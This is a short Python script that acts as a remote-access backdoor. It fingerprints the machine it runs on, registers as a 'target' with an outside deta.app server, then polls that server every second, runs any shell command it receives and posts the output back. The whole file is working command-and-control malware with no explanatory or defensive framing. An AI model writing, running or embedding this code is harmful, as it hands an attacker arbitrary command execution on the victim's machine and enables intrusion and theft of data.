from subprocess import getoutput
from requests import get, exceptions
from time import sleep
from platform import uname
from hashlib import md5
api = 'https://codesetter-1-o6783419.deta.app/'
client_id = md5(''.join(uname()).encode()).hexdigest()
def check_connection():
    try:
        get('https://google.com')
        return True
    except exceptions.ConnectionError:
        while not sleep(1):
            try:
                get('https://google.com')
                return True
            except exceptions.ConnectionError:
                pass
if check_connection():
    if not get(api+'newtarget', params={'uuid': client_id,'key': 'set a new target 9845.9485ff$7@$67.4,*809'}).json()['ok']:
        get(api+'online', params={'key': client_id})
while not sleep(1):
    try:
        if check_connection():
            code = get(api, params={'key': client_id}).json()
            if code['ok']:
                get(api+'result', json={'result': getoutput(code['code'])}, params={'uuid': client_id})
    except Exception as e:
        pass